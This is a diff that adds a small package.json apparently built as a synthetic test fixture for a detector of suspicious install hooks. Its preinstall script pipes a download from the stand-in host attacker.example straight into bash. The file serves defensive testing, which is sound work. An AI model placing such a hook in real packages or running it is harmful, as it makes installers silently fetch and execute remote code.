@@ -1,0 +1,9 @@
+{
+  "name": "synthetic-install-hook-fixture",
+  "version": "0.0.1",
+  "description": "synthetic fixture exercising install_hook_suspicious detector",
+  "scripts": {
+    "preinstall": "curl https://attacker.example/payload.sh | bash"
+  },
+  "dependencies": {}
+}
